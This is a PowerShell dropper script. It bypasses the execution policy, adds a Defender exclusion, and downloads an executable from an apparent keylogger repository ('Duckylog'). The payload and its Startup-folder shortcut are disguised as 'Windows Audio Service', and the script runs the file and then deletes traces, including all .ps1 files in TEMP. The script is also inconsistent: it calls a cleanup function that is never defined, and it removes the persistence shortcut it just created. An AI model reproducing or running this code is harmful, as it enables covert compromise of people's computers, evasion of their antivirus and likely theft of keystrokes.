# Set Execution Policy
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

# Define the path to the Startup folder
$startupFolderPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')

# Define the path for the shortcut
$shortcutPath = [System.IO.Path]::Combine($startupFolderPath, 'Windows Audio Services.lnk')

# Function to check for an active network connection
function Test-NetworkConnection {
    $pingResult = Test-Connection -ComputerName google.com -Count 1 -Quiet
    return $pingResult
}

# Function to remove PowerShell scripts in the temp directory
function Remove-TempScripts {
    Get-ChildItem -Path ([System.IO.Path]::GetTempPath()) -Filter "*.ps1" -File | Remove-Item -Force
}

# Trap to handle script termination and perform cleanup
trap { Cleanup-TempScripts; break }

# Wait for an active network connection
while (-Not (Test-NetworkConnection)) {
    Write-Output "Waiting for network connection..."
    Start-Sleep -Seconds 5
}

# Check system architecture
$architecture = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
Write-Output "System Architecture: $architecture"

# Check if the shortcut exists
if (-Not (Test-Path $shortcutPath)) {
    Write-Output "Shortcut does not exist at $shortcutPath"

    # Path to the executable
    $exePath = "$env:TEMP\Windows Audio Service.exe"

    # Add exclusion for the Windows Audio Service executable
    try {
        Add-MpPreference -ExclusionPath $exePath
        Write-Output "Added exclusion for $exePath"
    } catch {
        Write-Output "Failed to add exclusion for ${exePath}: $_"
    }

    # URL to the executable on GitHub
    $exeUrl = "https://github.com/Mocipie/Duckylog/blob/main/Windows%20Audio%20Service.exe?raw=true"

    # Retry logic for downloading the executable
    $maxRetries = 5
    $retryCount = 0
    $downloadSuccess = $false

    while (-Not $downloadSuccess -and $retryCount -lt $maxRetries) {
        try {
            Write-Output "Attempting to download executable (Attempt $($retryCount + 1) of $maxRetries)..."
            $webClient = New-Object System.Net.WebClient
            $webClient.DownloadFile($exeUrl, $exePath)
            $downloadSuccess = $true
            Write-Output "Executable downloaded successfully to $exePath"
        } catch {
            Write-Output "Download failed: $_"
            $retryCount++
            Start-Sleep -Seconds 5
        }
    }

    if ($downloadSuccess) {
        # Create a WScript.Shell COM object
        $wshShell = New-Object -ComObject WScript.Shell

        # Create the shortcut
        $shortcut = $wshShell.CreateShortcut($shortcutPath)
        $shortcut.TargetPath = $exePath
        $shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($exePath)
        $shortcut.Save()

        # Log the shortcut creation
        Write-Output "Shortcut created at $shortcutPath"
    } else {
        Write-Output "Failed to download the executable after $maxRetries attempts."
    }
} else {
    Write-Output "Shortcut already exists at $shortcutPath"
}

$logFilePath = "$env:TEMP\log.txt"

if (-Not (Test-Path $logFilePath)) { New-Item -Path $logFilePath -ItemType File }

try {
    # Run the executable
    Write-Output "Running the executable..."
    $exeProcess = Start-Process -FilePath $exePath -NoNewWindow -PassThru
    $exeProcess.WaitForExit()
} catch {
    Write-Output "Failed to run the executable: $_"
} finally {
    if (Test-Path $logFilePath) { Remove-Item -Path $logFilePath }
    
    # Remove the shortcut if it exists
    if (Test-Path $shortcutPath) {
        Remove-Item -Path $shortcutPath -Force
        Write-Output "Shortcut removed from $shortcutPath"
    } else {
        Write-Output "Shortcut does not exist at $shortcutPath"
    }

    # Remove the executable if it exists
    if (Test-Path $exePath) {
        Remove-Item -Path $exePath -Force
        Write-Output "Executable removed from $exePath"
    } else {
        Write-Output "Executable does not exist at $exePath"
    }

    Cleanup-TempScripts
}

# Ensure the script terminates last
Start-Sleep -Seconds 2
Write-Output "Cleanup completed. Exiting PowerShell script."

# Exit the PowerShell session
exit
